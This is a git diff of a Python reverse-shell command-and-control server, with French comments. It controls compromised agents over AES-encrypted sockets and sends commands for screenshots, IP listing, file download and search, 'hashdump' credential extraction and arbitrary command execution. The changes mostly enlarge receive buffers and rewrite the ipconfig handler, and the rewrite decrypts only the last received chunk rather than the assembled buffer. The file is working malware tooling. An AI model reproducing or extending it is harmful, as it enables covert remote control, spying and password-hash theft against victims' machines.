@@ -2,7 +2,7 @@ import socket
 import threading
 import os
 import re
-from base64 import b64decode
+from base64 import b64decode,b64encode
 from aes_crypt import AESCipher  # Import de la classe AESCipher depuis le fichier aes_crypt
 
 class ReverseShellServer:
@@ -42,7 +42,7 @@ class ReverseShellServer:
         try:
             data = b""
             while True:
-                part = conn.recv(1024)
+                part = conn.recv(4096)
                 if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                     data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                     break
@@ -137,7 +137,7 @@ class ReverseShellServer:
     def handle_screenshot(self, conn, client_id): # Fonction pour prendre un screenshot
         file_path = f"screenshot_{client_id}.png" # Nom du fichier de capture d'écran
         try: # On essaie de prendre un screenshot
-            longueur_img = int(conn.recv(1024).decode()) # On reçoit la taille de l'image
+            longueur_img = int(conn.recv(4096).decode()) # On reçoit la taille de l'image
             with open(file_path, "wb") as img: # On ouvre le fichier en mode écriture binaire
                 first_data = 0 # j'initialise la variable dl_data à 0
                 while first_data < longueur_img:  # Tant que dl_data est inférieur à len_img
@@ -151,46 +151,32 @@ class ReverseShellServer:
             print(f"[x] impossible de sauvegarder le screenshot: {e}")
 
     def handle_ipconfig(self, conn, client_id):
-        os_type = self.client_id_map[client_id]["os"]
-        if os_type == "Windows":
-            command = "powershell -Command \"Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne 'Disconnected' } | Select-Object -ExpandProperty IPv4Address,InterfaceAlias\""
-        else:
-            command = "hostname -I | awk '{print $1}'"
-        conn.send(AESCipher.encrypt(command).encode("utf-8"))
-        data = b""
+        conn.send(AESCipher.encrypt(f"ipconfig").encode("utf-8"))
+        encrypted_eof = AESCipher.encrypt("EOF").encode("utf-8")
+        buffer = b""
+        
         while True:
             part = conn.recv(1024)
-            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
-                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
+            if encrypted_eof in part:
+                # print(AESCipher.decrypt(part.decode("utf-8")))
+                buffer += part[:part.index(encrypted_eof)]
                 break
-            data += part
+            buffer += part
+        
         try:
-            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
-            interfaces = self.extract_interfaces_and_ips(decrypted_data)
+            ips = self.extract_interfaces_and_ips(AESCipher.decrypt(part.decode("utf-8")))
             print("[+] Local IP addresses and their interfaces:")
-            for interface, ip in interfaces.items():
-                print(f"[+] {interface}: {ip}")
+            for ip in ips:
+                print(f"[+] Agent {client_id} IP ==> {ip}")
         except Exception as e:
             print(f"[x] Failed to decrypt ipconfig data: {e}")
 
     def extract_interfaces_and_ips(self, data):
-        interfaces = {}
-        windows_pattern = re.compile(
-            r"InterfaceAlias\s+:\s+(?P<interface>[\w\s]+).*?IPv4Address\s+:\s+(?P<ip>\d+\.\d+\.\d+\.\d+)",
-            re.DOTALL,
-        )
-        linux_pattern = re.compile(r"(\w+):\s.*\sinet\s(?P<ip>\d+\.\d+\.\d+\.\d+)")
+        # Extract IP addresses using regex
+        ip_regex = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
+        ips = re.findall(ip_regex, data)
+        return ips
 
-        if "InterfaceAlias" in data:
-            matches = windows_pattern.finditer(data)
-            for match in matches:
-                interfaces[match.group("interface").strip()] = match.group("ip").strip()
-        else:
-            matches = linux_pattern.finditer(data)
-            for match in matches:
-                interfaces[match.group(1).strip()] = match.group("ip").strip()
-
-        return interfaces
 
     def handle_download(self, file_path, conn):
         conn.send(AESCipher.encrypt(f"download {file_path}").encode("utf-8"))
@@ -230,7 +216,7 @@ class ReverseShellServer:
         conn.send(AESCipher.encrypt(f"search {file_name}").encode("utf-8"))
         data = b""
         while True:
-            part = conn.recv(1024)
+            part = conn.recv(4096)
             if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                 data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                 break
@@ -246,7 +232,7 @@ class ReverseShellServer:
         conn.send(AESCipher.encrypt("hashdump").encode("utf-8"))
         data = b""
         while True:
-            part = conn.recv(1024)
+            part = conn.recv(4096)
             if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                 data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                 break
@@ -270,7 +256,7 @@ class ReverseShellServer:
         conn.send(AESCipher.encrypt(command).encode("utf-8"))
         data = b""
         while True:
-            part = conn.recv(1024)
+            part = conn.recv(4096)
             if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                 data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                 break
